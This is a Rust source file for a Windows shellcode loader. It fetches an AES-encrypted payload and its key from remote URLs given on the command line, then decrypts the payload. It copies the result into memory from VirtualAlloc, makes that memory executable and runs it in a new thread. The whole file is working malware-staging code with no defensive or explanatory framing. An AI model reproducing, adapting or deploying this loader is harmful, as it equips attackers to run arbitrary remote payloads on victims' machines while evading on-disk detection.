extern crate aes;
extern crate block_modes;
extern crate pbkdf2;
extern crate sha2;
extern crate hex;
extern crate hmac;
extern crate reqwest;

use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use std::env;
use windows_sys::Win32::{
    Foundation::{GetLastError, FALSE},
    System::Memory::{
        VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
    },
    System::Threading::{CreateThread, WaitForSingleObject, INFINITE},
};
use std::ptr::{null, null_mut, copy_nonoverlapping};
use std::mem::transmute;

type Aes256Cbc = Cbc<Aes256, Pkcs7>;

const IV_SIZE: usize = 16;  // AES block size

fn perform_operation(operation: &str, input_url: &str, key_url: Option<&str>) -> Result<(), std::io::Error> {
    match operation {
        "-exec" => {
            if let Some(key_url) = key_url {
                match unsafe { execute_decrypt(input_url, key_url) } {
                    Ok(_) => {
                        println!("Decryption and execution succeeded.");
                        Ok(())
                    }
                    Err(e) => {
                        eprintln!("Error: {}", e);
                        Err(std::io::Error::new(std::io::ErrorKind::Other, e))
                    }
                }
            } else {
                eprintln!("Please provide the right arguments.");
                Err(std::io::Error::new(std::io::ErrorKind::Other, "Invalid arguments provided"))
            }
        },
        _ => {
            eprintln!("Invalid option");
            eprintln!("Usage: ./rust -exec <http://ip_address/encrypted> <http://ip_address/key>");
            Err(std::io::Error::new(std::io::ErrorKind::Other, "Invalid option provided"))
        }
    }
}

fn fetch_file_from_url(url: &str) -> Result<Vec<u8>, reqwest::Error> {
    let response = reqwest::blocking::get(url)?;
    let content = response.bytes()?;
    Ok(content.to_vec())
}

unsafe fn execute_decrypt(input_url: &str, key_url: &str) -> Result<(), String> {
    let key = fetch_file_from_url(key_url).map_err(|e| e.to_string())?;
    let encrypted_data = fetch_file_from_url(input_url).map_err(|e| e.to_string())?;

    let iv = vec![0u8; IV_SIZE];

    let cipher = Aes256Cbc::new_from_slices(&key, &iv).map_err(|e| e.to_string())?;
    let decrypted_data = cipher.decrypt_vec(&encrypted_data).map_err(|e| e.to_string())?;

    let shellcode_size = decrypted_data.len();

    let addr = VirtualAlloc(
        null(),
        shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if addr.is_null() {
        return Err(format!("VirtualAlloc failed: {}!", GetLastError()));
    }

    // Copy the decrypted shellcode into the allocated memory.
    copy_nonoverlapping(decrypted_data.as_ptr(), addr as *mut u8, shellcode_size);

    let mut old = PAGE_READWRITE;
    let res = VirtualProtect(addr, shellcode_size, PAGE_EXECUTE, &mut old);
    if res == FALSE {
        return Err(format!("VirtualProtect failed: {}!", GetLastError()));
    }

    // Convert the allocated memory address to a thread start function pointer.
    let thread_start: extern "system" fn(*mut _) -> u32 = transmute(addr);
    let thread = CreateThread(null(), 0, Some(thread_start), null(), 0, null_mut());
    if thread == 0 {
        return Err(format!("CreateThread failed: {}!", GetLastError()));
    }

    WaitForSingleObject(thread, INFINITE);
    Ok(())
}

fn main() -> std::io::Result<()> {
    let args: Vec<String> = env::args().collect();

    if args.len() < 4 {
        eprintln!("Usage: ./rust -exec <http://ip_address/encrypted> <http://ip_address/key>");
        std::process::exit(1);
    }

    perform_operation(&args[1], &args[2], Some(&args[3]))
        .expect("Error: could not execute operation");

    Ok(())
}
